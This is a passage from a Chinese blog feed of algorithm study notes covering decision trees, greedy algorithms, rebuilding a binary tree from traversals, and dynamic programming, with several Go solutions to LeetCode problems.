        <content type="html"><![CDATA[<h1 id="决策树">决策树</h1><h2 id="什么是决策树">什么是决策树</h2><p><code>分类决策树模型</code>是一种描述对实例进行分类的树形结构。<code>决策树</code>由结点和有向边组成。结点有两种类型：内部结点和叶节点。<strong>内部结点</strong>表示一个特征或属性，<strong>叶节点</strong>表示一个类。</p><h2 id="决策树学习算法的特点">决策树学习算法的特点</h2><ul><li>最大优点：自学习。在学习的过程中，不需要使用者了解过多背景知识，只需要对训练实例进行较好的标注，就能够进行学习。</li><li>从一类无序、无规则的事物(概念)中推理出决策树所表示的分类规则。</li><li>它属于有监督学习。</li></ul><h2 id="决策树的主要算法">决策树的主要算法</h2><p>建立决策树的关键，是在当前状态下选择哪个属性作为分类依据。<br>根据不同的<code>目标函数</code>，主要有以下三种决策树算法：</p><ul><li>ID3（J. Ross Quinlan-1975），核心为<code>信息熵</code></li><li>C4.5（ID3的改进），核心为<code>信息增益比</code></li><li>CART（Breiman-1984），核心为<code>基尼系数</code></li></ul><h2 id="主要步骤">主要步骤</h2><p>将特征空间划分为互不相交的单元或区域，并在每个单元定义一个类的概率分布，这就构成了一个条件概率分布。<br>各个叶结点（单元）上的条件概率往往偏向某一个类，即属于某一类的概率较大，决策树算法在分类时将该结点的实例（样本？）强行分到条件概率大的那一类去。</p><p>本质上就是从训练数据集中归纳出一组分类规则。</p><ul><li>从根节点开始递归生成树，根节点对应整个训练集的样本。</li><li>对于每一个节点对应的数据集合，算法需要选择出其中的某个特征，使得以该特征进行数据的划分能够使划分效果（相当于区分度）达到最优，然后将其划分为子节点进行递归地划分。</li><li>直到到达某个子结点无法再进行有效的划分（例如最优的信息增益小于阈值？），则将该节点作为最终的决策结果，生成叶子结点。</li></ul><h2 id="基本概念以及特征选择方法">基本概念以及特征选择方法</h2><h3 id="熵">熵</h3><p><code>熵</code>在信息论中，是接收的每条消息中包含的<code>信息的平均量</code>，换句话说，如果某个不容易发生的事情发生了，会告诉我们一些特别的信息。</p><p><code>熵</code>表示随机变量不确定性的度量。熵越大，随机变量的不确定性就越大（例如完美抛硬币的熵为1）<br>熵的计算方法如下：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240619134521.png" alt="image.png"></p><p>就分类而言，如果所有的成员都属于一类，熵为0；<br>不同类别的成员数目相等（例如完美抛硬币），则熵为1；<br>否则如果类别数目不相等，则熵介于0和1之间。</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240619134753.png" alt="image.png"></p><p>显然，当p=0或p=1时，H§=0，随机变量完全没有不确定性。</p><h3 id="条件熵">条件熵</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240619134912.png" alt="image.png"></p><h3 id="信息增益">信息增益</h3><p>信息增益表示：得知特征x的信息而使得类Y的信息不确定性减少的程度（也就是熵减的量）。<br><code>信息增益</code>：特征A对训练数据集D的信息增益g(D,A),定义为集合D的经验熵H(D)与特征A给定条件下D的经验条件熵H(DIA)之差，即g(D,A) = H(D) - H(D|A)</p><p>关注到决策树：<br>很显然，如果决策树的某个节点对当前的数据集以某个特征Ai做出了正确的决策（或者理解为分类，划分），必定能够让两个集合的区分度更大，每个集合中的数据的特征更加统一整齐。这样就相当于从原本混乱的数据集中划分出了2个相对整齐的子集，熵自然减小。（例如原本的数据集合是蓝色和红色小球混合，两个子集就是所有的蓝色小球和所有的红色小球，混乱度大大降低，本例中降为0？）</p><p>当然，一个数据集中不止一个特征A，因此要对于每一个特征Ai都计算信息增益gi，选择出最大的那一个，以此作为最优的划分。这就是<code>根据信息增益准则的特征选择方法</code>。</p><p>ID3算法使用信息增益。</p><p>具体公式：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240619140009.png" alt="image.png"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240619140024.png" alt="image.png"><br>举个栗子：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240619140051.png" alt="image.png"></p><p><code>根据信息增益准则的特征选择方法</code>的问题：偏向于选择取值较多的特征，从而导致<code>过拟合</code>（应该是？）。<br>使用<code>信息增益比</code>可以很大程度上解决这个问题。</p><h3 id="信息增益比">信息增益比</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240619140340.png" alt="image.png"></p><p>C4.5算法使用信息增益比。</p><h2 id="决策树基本流程">决策树基本流程</h2><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240619140501.png" alt="image.png|875"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240619140534.png" alt="image.png|500"></p><p>具体的<code>ID3</code>和<code>C4.5</code>算法，这里略，容易找到相关资料。</p><h1 id="随机梯度下降">随机梯度下降</h1><p>略。。。</p><p>注：本文参考自课程ppt</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 决策树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>贪心算法</title>
      <link href="/20249ff6699681bf/"/>
      <url>/20249ff6699681bf/</url>
      
        <content type="html"><![CDATA[<h1 id="概述">概述</h1><p>贪心算法的思想非常简单：在对问题求解时，不从整体最优上加以考虑，而总是做出在当前看来是最好的选择。也就是说，所做出的是在某种意义上的局部最优解。</p><p>换句话说，与动态规划的全局性不同，贪心算法显得目光短浅，但是如果分析正确，并不会导致结果错误。</p><p>然而，贪心算法并不是对所有问题都能得到整体最优解，关键是贪心策略的选择，选择的贪心策略必须具备<code>无后效性</code>，即某个状态只与它前面出现的状态有关，而独立于后面的状态。<br>例如“数字金字塔”问题，就无法使用贪心算法，因为每层的路径选择都会影响后续的选择，当前的最优选择很可能会导致后续更大价值的路线被舍弃掉导致错误。</p><p>可以用贪心算法解决的问题有如下两个性质：</p><ul><li>贪心选择性质：所求的问题的<code>整体最优解</code>可以通过一系列<code>局部最优</code>的选择，也就是贪心选择得到。贪心选择是采用从顶向下、以迭代的方法做出相继选择，每做一次贪心选择，就将所求问题简化为一个规模更小的子问题。</li><li>最优子结构性质：即原问题的最优解包含的子问题的最优解，而且这些子问题可以独立求解，核心思想是“全局最优解包含局部最优解”。</li></ul><h1 id="特定问题的解决方式选择">特定问题的解决方式选择</h1><p>算法核心：状态与状态的转移<br>对于一个特定的问题，用递推、贪心、搜索还是动态规划的哪一种方式来解决，是由其状态的转移方式决定的：</p><ul><li>每个阶段只有一个状态-&gt;递推；</li><li>每个阶段的最优状态都是由上一个阶段的最优状态得到的-&gt;贪心；</li><li>每个阶段的最优状态是由之前所有阶段的状态的组合得到的-&gt;搜索；</li><li>每个阶段的最优状态可以从之前某个阶段的某个或某些状态直接得到而不管之前这个状态是如何得到的-&gt;动态规划。</li></ul><h1 id="贪心和动态规划的区别">贪心和动态规划的区别</h1><ol><li>贪心算法的每一次操作都对结果产生直接影响，而动态规划则不是。</li><li>贪心算法对每个子问题的解决方案都做出选择，不能回退；动态规划则会根据以前的选择结果对当前进行选择，有回退功能。</li><li>动态规划主要运用于二维或三维问题，而贪心一般是一维问题。</li></ol><p>本质上，贪心是一种特殊的动态规划，只不过由于其由于其具有贪心选择性质，因此保证了子问题只会被计算一次，不会被多次计算。</p><p>另一方面，关于 <code>最优子结构性质</code>：</p><ul><li>贪心的局部最优一定能达成全局最优</li><li>动态规划的全局最优值中不一定全是局部最优，只是求解全局最优时要以局部最优作为基础</li></ul><h1 id="重要问题">重要问题</h1><h2 id="分发饼干">分发饼干</h2><p>题号：力扣455</p><p>很简单，将 <code>g</code> 和 <code>s</code> 从小到大排序即可，使用2个指针 <code>i</code> 和 <code>j</code> 逐个遍历；<br>如果当前 <code>g[i]&lt;=s[j]</code>，那么<code>i++;j++;</code>，继续考虑下一个孩子和饼干；<br>否则 <code>j++</code>，尝试使用下一块饼干满足孩子，直到遍历完毕。</p><p>Go代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findContentChildren</span><span class="params">(g []<span class="type">int</span>, s []<span class="type">int</span>)</span></span> (ans <span class="type">int</span>) &#123;</span><br><span class="line">    sort.Ints(g)</span><br><span class="line">    sort.Ints(s)</span><br><span class="line">    m, n := <span class="built_in">len</span>(g), <span class="built_in">len</span>(s)</span><br><span class="line">    <span class="keyword">for</span> i, j := <span class="number">0</span>, <span class="number">0</span>; i &lt; m &amp;&amp; j &lt; n; i++ &#123;</span><br><span class="line">        <span class="keyword">for</span> j &lt; n &amp;&amp; g[i] &gt; s[j] &#123;</span><br><span class="line">            j++</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> j &lt; n &#123;</span><br><span class="line">            ans++</span><br><span class="line">            j++</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="无重叠区间">无重叠区间</h2><p>以右边界排序，然后进行枚举，维护当前right右边界，对不重叠的区间进行计数即可，最后用总区间数做差即可。<br>具体分析见力扣453官方题解。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">eraseOverlapIntervals</span><span class="params">(intervals [][]<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    n := <span class="built_in">len</span>(intervals)</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    sort.Slice(intervals,<span class="function"><span class="keyword">func</span><span class="params">(i,j <span class="type">int</span>)</span></span><span class="type">bool</span>&#123; <span class="keyword">return</span> intervals[i][<span class="number">1</span>] &lt; intervals[j][<span class="number">1</span>] &#125;)</span><br><span class="line">    right := intervals[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">    ans := <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">1</span>;i&lt;n;i++&#123;</span><br><span class="line">        <span class="keyword">if</span> intervals[i][<span class="number">0</span>] &gt;= right &#123;</span><br><span class="line">            ans++</span><br><span class="line">            right = intervals[i][<span class="number">1</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n-ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="哈夫曼编码">哈夫曼编码</h2><p>略。。。</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240617183148.png" alt="image.png"></p><h2 id="prim算法和kruskal算法">Prim算法和Kruskal算法</h2><p>略。。。<br>都是要将权重排序，每次选取当前最小权重，让生成树生成或合并。</p><p>注：本文参考自课程ppt</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 贪心算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从前序与中序遍历序列构造二叉树</title>
      <link href="/2024440f3ed98daa/"/>
      <url>/2024440f3ed98daa/</url>
      
        <content type="html"><![CDATA[<p>本文对应题目练习：<a href="https://leetcode.cn/problems/construct-binary-tree-from-preorder-and-inorder-traversal/description/">力扣105</a><br>内容参考自官方题解</p><h1 id="前序和中序性质">前序和中序性质</h1><p>以这棵树为例:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">        <span class="number">3</span></span><br><span class="line">       / \</span><br><span class="line">      <span class="number">9</span>  <span class="number">20</span></span><br><span class="line">     /  /  \</span><br><span class="line">    <span class="number">8</span>  <span class="number">15</span>   <span class="number">7</span></span><br><span class="line">   / \</span><br><span class="line">  <span class="number">5</span>  <span class="number">10</span></span><br><span class="line"> /</span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure><p>其前序和中序遍历分别为<br><code>preorder = [3, 9, 8, 5, 4, 10, 20, 15, 7]</code><br><code>inorder = [4, 5, 8, 10, 9, 3, 15, 20, 7]</code></p><p>以根节点3为例：</p><ol><li>对于前序而言，3一定是第一个元素，后面剩下的元素从某个位置分为左右2个部分，左边均为3的左子孙，右边均为3的右子孙</li><li>对于中序而言，3左边的所有元素均为3的左子孙，右边均为3的右子孙</li><li>按照上述的划分，2个子数组分别作为3的左右子树，递归地满足1和2性质</li></ol><h1 id="从前序与中序遍历序列构造二叉树">从前序与中序遍历序列构造二叉树</h1><h2 id="递归法">递归法</h2><p>根据前序遍历的性质，对于某个子树的前序序列，可以直接找到其根节点。<br>那么很容易想到，可以进一步在中序遍历中划分出当前根节点的左右子树序列，同时根据长度也可以把前序的左右子树序列同样求出；<br>这样不断划分子树，向下递归，即可逐步重建出整棵树来。</p><p>Go语言代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *     Val int</span></span><br><span class="line"><span class="comment"> *     Left *TreeNode</span></span><br><span class="line"><span class="comment"> *     Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">buildTree</span><span class="params">(preorder []<span class="type">int</span>, inorder []<span class="type">int</span>)</span></span> *TreeNode &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(preorder) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建当前子树的根节点</span></span><br><span class="line">rootVal := preorder[<span class="number">0</span>]</span><br><span class="line">root := &amp;TreeNode&#123;Val: rootVal&#125;</span><br><span class="line"><span class="comment">// 拆分该根节点的左右子树的遍历序列</span></span><br><span class="line">leftInOrder := inorder[:getIndex(inorder, rootVal)]</span><br><span class="line">rightInOrder := inorder[getIndex(inorder, rootVal)+<span class="number">1</span>:]</span><br><span class="line">leftPreOrder := preorder[<span class="number">1</span> : <span class="built_in">len</span>(leftInOrder)+<span class="number">1</span>]</span><br><span class="line">rightPreOrder := preorder[<span class="built_in">len</span>(leftInOrder)+<span class="number">1</span>:]</span><br><span class="line"><span class="comment">// 递归遍历,并进行连接即可</span></span><br><span class="line">root.Left = buildTree(leftPreOrder,leftInOrder)</span><br><span class="line">root.Right = buildTree(rightPreOrder,rightInOrder)</span><br><span class="line"><span class="keyword">return</span> root</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getIndex</span><span class="params">(arr []<span class="type">int</span>, val <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span> arr &#123;</span><br><span class="line"><span class="keyword">if</span> v == val &#123;</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="迭代法">迭代法</h2><p>注：本文主要记录了一些细节的逻辑部分，主要的代码思想在官方题解中已经写的很好了。</p><p>很巧妙的做法，核心基于前序遍历的一个性质：<br>对于任意两个连续节点 <code>u</code> 和 <code>v</code> ，其只有2种可能的关系：</p><ul><li><code>v</code> 是 <code>u</code> 的左儿子。因为如果<code>u</code>是当前子树的根节点，那么在遍历到 <code>u</code> 之后，下一个遍历的节点就是 <code>u</code> 的左儿子，即 <code>v</code>；</li><li><code>u</code> 没有左儿子，并且 <code>v</code> 是 <code>u</code> 的某个祖先节点（或者 <code>u</code> 本身）的右儿子。如果 <code>u</code> 没有左儿子，那么下一个遍历的节点就是 <code>u</code> 的右儿子。如果 <code>u</code> 没有右儿子，就向上不断回溯，直到遇到第一个有右儿子（且 <code>u</code> 不在它的右儿子的子树中）的节点 <code>a</code> ，<code>v</code> 就是 <code>a</code> 的右儿子。</li></ul><p>可以根据这棵树来自己思考一下（例如节点4和节点10）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">        <span class="number">3</span></span><br><span class="line">       / \</span><br><span class="line">      <span class="number">9</span>  <span class="number">20</span></span><br><span class="line">     /  /  \</span><br><span class="line">    <span class="number">8</span>  <span class="number">15</span>   <span class="number">7</span></span><br><span class="line">   / \</span><br><span class="line">  <span class="number">5</span>  <span class="number">10</span></span><br><span class="line"> /</span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure><p>根据上面的性质，我们可以直接枚举前序遍历序列，第一个元素必定是根节点。遍历的每一个元素<code>i</code>：</p><ol><li>要么是上一个元素的左孩子；</li><li>要么就是前面某个元素<code>k</code>的右孩子。</li></ol><p>对于第一种情况，不断地向左链接即可；<br>如果遇到了第二种情况，就需要回溯找到这个元素的父亲<code>k</code>，然后将<code>i</code>作为<code>k</code>的右孩子链接即可。</p><p>接下来，考虑如何回溯：<br>考虑到在保持第一种情况下，访问的一系列元素构成一个<code>左斜树</code>，我们用一个栈来记录，当出现了第二种情况时，逐渐弹出栈顶，检验这个栈顶元素是否为满足条件的<code>k</code>，如果是，将<code>i</code>连接为其右孩子即可，然后继续压栈运行。</p><p>再接下来，考虑如何发现第二种情况发生：<br>事实上，栈中的各个元素，从栈顶到栈底，靠栈底元素一定是靠栈顶元素的父亲或祖先。假设一直发生第一种情况，此时中序遍历的序列从左向右的顺序恰好就是栈中从顶到底的序列。<br>因此，如果我们一直向左子树迭代，到达叶子后就可以进行回溯了，因为接下来必定向（某个）右子树继续迭代，因此必然会出现第二种情况。<br>这时，我们不断出栈，就能够从栈中找到接下来要迭代的右子树的根节点<code>k</code>，并且在中序遍历序列中，一定会在靠右边（即靠上，即祖先）找到这个元素<code>k</code>（可以考虑一下左斜树的中序遍历），所以，在出栈的时候，不断使用一个指针<code>p</code>右移就可以找到这个元素。</p><p>最后，考虑如何检查到达了叶子：<br>考虑到，既然我们能够从栈中找到<code>k</code>，那么使用指针<code>p</code>来找到<code>k</code>是没有必要的；<br>但是指针<code>p</code>可以用来标识当前子树的“最靠左”的叶子！只需要让<code>p</code>指向当前子树根节点的右边一个节点即可！<br>因此，在迭代的时候，只需要检查当前节点是否和中序遍历序列中<code>p</code>指向的节点相等即可，如果相等，说明到达叶子，此时进行回溯即可。</p><p>此外，如果是已知中序和后序，那么只需要将上述过程做一个镜像即可。</p><p>上面是主要的思路细节，接下来观察代码即可：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *     Val int</span></span><br><span class="line"><span class="comment"> *     Left *TreeNode</span></span><br><span class="line"><span class="comment"> *     Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">buildTree</span><span class="params">(preorder []<span class="type">int</span>, inorder []<span class="type">int</span>)</span></span> *TreeNode &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(preorder) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">n := <span class="built_in">len</span>(preorder)</span><br><span class="line">rootVal := preorder[<span class="number">0</span>]</span><br><span class="line">root := &amp;TreeNode&#123;Val: rootVal&#125;</span><br><span class="line">stack := []*TreeNode&#123;root&#125;</span><br><span class="line"><span class="comment">//cur := root</span></span><br><span class="line"><span class="keyword">for</span> i, j := <span class="number">1</span>, <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">cur := stack[<span class="built_in">len</span>(stack)<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">if</span> cur.Val != inorder[j] &#123;</span><br><span class="line">cur.Left = &amp;TreeNode&#123;Val: preorder[i]&#125;</span><br><span class="line">stack = <span class="built_in">append</span>(stack, cur.Left)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">len</span>(stack) != <span class="number">0</span> &amp;&amp; stack[<span class="built_in">len</span>(stack)<span class="number">-1</span>].Val == inorder[j] &#123;</span><br><span class="line">cur = stack[<span class="built_in">len</span>(stack)<span class="number">-1</span>]</span><br><span class="line">stack = stack[:<span class="built_in">len</span>(stack)<span class="number">-1</span>]</span><br><span class="line">j++</span><br><span class="line">&#125;</span><br><span class="line">cur.Right = &amp;TreeNode&#123;Val: preorder[i]&#125;</span><br><span class="line">stack = <span class="built_in">append</span>(stack, cur.Right)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> root</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 栈 </tag>
            
            <tag> 二叉树 </tag>
            
            <tag> 递归 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态规划续</title>
      <link href="/202493b2d4f2cb41/"/>
      <url>/202493b2d4f2cb41/</url>
      
        <content type="html"><![CDATA[<h1 id="线性动态规划">线性动态规划</h1><p><code>线性动态规划</code>的主要特点是状态的推导是按照问题规模 i 从小到大依次推过去的，较大规模的问题的解依赖较小规模的问题的解。这里问题规模为 i 的含义是考虑前 i 个元素<code>[0..i]</code>时问题的解。</p><p>状态定义：<br><code>dp[n] := [0..n]</code> 上问题的解<br>状态转移：<br><code>dp[n] = f(dp[n-1], ..., dp[0])</code></p><p>从线性动态规划的状态中可以看出，大规模问题的状态只与较小规模的问题有关，而问题规模完全用一个变量 i 表示，i 的大小表示了问题规模的大小，因此从小到大推 i 直至推到 n，就得到了大规模问题的解，这就是线性动态规划的过程。</p><p>线性动态规划解决的问题主要是单串，双串，矩阵上的问题。</p><p>具体例题有：最大子数组和、最长上升子序列（参见我的博客）、粉刷房子（带维度单串<code>dp[i][k]</code>）</p><h1 id="区间动态规划">区间动态规划</h1><p>区间 DP 是状态的定义和转移都与区间有关，其中区间用两个端点表示。</p><p>状态定义 <code>dp[i][j]</code> 代表在区间 <code>[i..j]</code> 上原问题的解。推导状态的过程一般按照区间长度从短到长逐渐求得。</p><p>以单串为例，对于 <code>dp[i][j]</code> ，原问题的解增加 i，减小 j 都可以得到更小规模的子问题。</p><p>具体例题有：最长回文子序列（这个题的转移方程很巧妙，需要多看看，参见力扣官方题解）</p><h1 id="实际应用中的动态规划">实际应用中的动态规划</h1><p>Bellman-Ford算法：处理存在负权边的单源最短路问题的算法，效率不高，但是可以判断是否存在负权环<br>强化学习（相关内容：马尔科夫决策过程-MDP）</p><p>注：本文参考自课程ppt</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 动态规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态规划</title>
      <link href="/2024e1d577afb181/"/>
      <url>/2024e1d577afb181/</url>
      
        <content type="html"><![CDATA[<h1 id="概述">概述</h1><p>动态规划是通过把原问题分解为相对简单的子问题的方式求解复杂问题的方法，常常适用于有重叠子问题和最优子结构性质的问题。</p><p>简单来说，动态规划其实就是，给定一个问题，我们把它拆成一个个子问题，直到子问题可以直接解决。然后呢，把子问题答案保存起来，以减少重复计算。再根据子问题答案反推，得出原问题解的一种方法。</p><h1 id="找零问题">找零问题</h1><p>钞票面额为1,5,11时：<br>f(n)=min{f(n−1),f(n−5),f(n−11)}+1</p><h1 id="青蛙跳台阶">青蛙跳台阶</h1><p>斐波那契即可：<br>f(n) = f(n-1) + f(n-2)</p><h1 id="动态规划的解题思路">动态规划的解题思路</h1><h2 id="动态规划的特点">动态规划的特点</h2><p>动态规划从较小问题的解，由交叠性质，逐步决策出较大问题的解，所以称为自底向上的解法。</p><p>动态规划有几个典型特征，最优子结构、状态转移方程、边界、重复子问题、无后效性。在青蛙跳阶问题中：<br>•f(n-1)和f(n-2) 称为 f(n) 的最优子结构<br>•f(n)= f(n-1) + f(n-2)就称为状态转移方程<br>•f(1) = 1, f(2) = 2 就是边界<br>•比如f(10)= f(9)+f(8),f(9) = f(8) + f(7) ,f(8)就是重复子问题</p><ol><li><p>最优子结构：最优子结构指的是，问题的最优解包含子问题的最优解。反过来说就是，我们可以通过子问题的最优解，推导出问题的最优解。如果我们把最优子结构，对应到我们前面定义的动态规划问题模型上，那我们也可以理解为，后面阶段的状态可以通过前面阶段的状态推导出来。</p></li><li><p>无后效性：无后效性有两层含义，第一层含义是，在推导后面阶段的状态的时候，我们只关心前面阶段的状态值，不关心这个状态是怎么一步一步推导出来的。第二层含义是，某阶段状态一旦确定，就不受之后阶段的决策影响。无后效性是一个非常“宽松”的要求。只要满足前面提到的动态规划问题模型，其实基本上都会满足无后效性。</p></li><li><p>重复子问题：不同的决策序列，到达某个相同的阶段时，可能会产生重复的状态。</p></li></ol><h2 id="解题步骤">解题步骤</h2><ol><li>定义数组元素的含义：例如定义<code>dp[i]</code>的含义</li><li>找出数组元素之间的关系式：也就是dp数组各个元素之间的递推关系，即状态转移方程</li><li>确定初始条件：一般为<code>dp[0]</code>、<code>dp[1]</code>等初始值的初始化</li></ol><p>例题（见PPT）：不同路径、最小路径和、编辑距离。<br>其中“编辑距离”见如下提示：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">对“dp[i-1][j-1] 表示替换操作，dp[i-1][j] 表示删除操作，dp[i][j-1] 表示插入操作。”的补充理解：</span><br><span class="line"></span><br><span class="line">以 word1 为 &quot;horse&quot;，word2 为 &quot;ros&quot;，且 dp[5][3] 为例，即要将 word1的前 5 个字符转换为 word2的前 3 个字符，也就是将 horse 转换为 ros，因此有：</span><br><span class="line"></span><br><span class="line">(1) dp[i-1][j-1]，即先将 word1 的前 4 个字符 hors 转换为 word2 的前 2 个字符 ro，然后将第五个字符 word1[4]（因为下标基数以 0 开始） 由 e 替换为 s（即替换为 word2 的第三个字符，word2[2]）</span><br><span class="line"></span><br><span class="line">(2) dp[i][j-1]，即先将 word1 的前 5 个字符 horse 转换为 word2 的前 2 个字符 ro，然后在末尾补充一个 s，即插入操作</span><br><span class="line"></span><br><span class="line">(3) dp[i-1][j]，即先将 word1 的前 4 个字符 hors 转换为 word2 的前 3 个字符 ros，然后删除 word1 的第 5 个字符</span><br></pre></td></tr></table></figure><ol 